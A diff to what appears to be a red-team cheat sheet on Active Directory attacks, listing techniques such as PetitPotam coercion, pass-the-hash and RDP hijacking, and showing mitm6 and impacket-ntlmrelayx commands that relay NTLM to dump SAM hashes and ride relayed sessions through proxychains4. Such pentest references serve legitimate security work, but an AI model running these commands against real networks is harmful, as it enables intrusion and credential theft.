@@ -21,7 +21,7 @@ blue in PURPLE-TEAM.md). That's deliberate, for three reasons, plus one honest g
      entries stay unprojected because the prose here is the richer superset — the
      sharper token (`<dc-ip>` not the projected `<ip_address>`), inline pedagogy, and
      follow-up chain steps the entry omits. adcs-esc1-certipy, bloodhound-collect,
-     coerce-petitpotam, ntlm-relay-ntlmrelayx, pth-lateral-nxc and reverse-tunnel-chisel
+     coerce-petitpotam, ntlm-relay-ntlmrelayx, pth-lateral-nxc, rdp-hijack-tscon and reverse-tunnel-chisel
      are covered that way below. Two of those are not clean members, so say which:
        - rdp-hijack-tscon is the WEAK one — its two commands are byte-identical to the
          ones below. Equal, not richer.
@@ -505,7 +505,7 @@ sudo mitm6 -d <domain>                                       # IPv6/DNS takeover
 impacket-ntlmrelayx -tf relaytargets.txt -smb2support              # relay in, dump SAM
 impacket-ntlmrelayx -t smb://<ip_address> -smb2support -socks      # -socks keeps the session
 proxychains4 nxc smb <ip_address>                                  # ride the relayed session
-# the binary is proxychains4 — the apt pkg Provides: proxychains but ships NO such binary.
+# the binary is proxychains4, NOT bare `proxychains` — a real proxychains pkg (3.1-9) exists and ships /usr/bin/proxychains3, so `apt install proxychains` silently hands you the 2007 tool.
 ////////////////////////////////////////
 
 
